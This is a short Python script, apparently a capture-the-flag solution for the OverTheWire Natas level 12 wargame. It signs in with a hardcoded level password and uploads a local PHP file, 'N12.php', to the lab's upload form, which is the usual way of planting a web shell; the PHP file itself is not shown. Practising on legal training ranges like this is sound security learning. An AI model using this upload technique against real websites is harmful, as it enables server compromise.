#!/bin/python
import requests
import re
import urllib
import base64

username = "natas12"
pwd = "EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"
url = f"http://{username}.natas.labs.overthewire.org"
session = requests.Session()
#response = session.get(url,auth=(username,pwd))
file={'file':open('N12.php','rb')}
response = session.post(url,files = file,auth=(username,pwd))
content=response.text
print(content)
